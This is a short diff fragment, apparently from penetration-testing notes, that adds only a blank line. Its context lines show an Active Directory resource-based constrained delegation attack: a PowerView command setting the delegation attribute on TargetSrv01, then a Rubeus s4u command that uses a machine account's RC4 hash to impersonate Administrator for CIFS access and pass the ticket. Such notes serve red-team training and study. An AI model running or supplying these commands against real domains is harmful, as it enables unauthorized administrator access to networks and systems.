@@ -35,3 +35,4 @@ Get-DomainComputer -Identity TargetSrv01 | Set-DomainObject -Set @{'msdsallowedt
 # Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target
 .\Rubeus.exe s4u /user:InconspicuousMachineAccount$ /rc4:3644AC5E3D9441CCBCEF08CBAF98E910 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv01.corp1.com /ptt
 ```
+
